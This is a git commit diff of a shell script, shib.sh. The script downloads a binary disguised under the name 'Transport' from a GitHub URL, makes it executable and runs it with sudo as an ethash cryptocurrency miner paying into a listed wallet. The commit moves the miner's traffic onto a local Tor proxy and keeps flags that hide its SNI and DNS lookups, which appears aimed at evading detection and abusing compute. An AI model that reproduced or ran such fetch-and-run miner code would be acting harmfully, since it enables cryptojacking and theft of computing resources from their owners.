5fe7ee5daf2825d0cd9e26e73c9c16e8c09ddac7
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-07-11 09:39:52 +0530

    Update shib.sh

--- shib.sh
+++ shib.sh
@@ -6,12 +6,5 @@ ln -fs /usr/share/zoneinfo/Japan/Tokyo /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x Transport
-ph add Transport
 sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-ph add Transport
-sleep 9
-sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 37.221.193.221:26334 --dns-https-server 1.1.1.1
+sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 127.0.0.1:9050 --dns-https-server 1.1.1.1
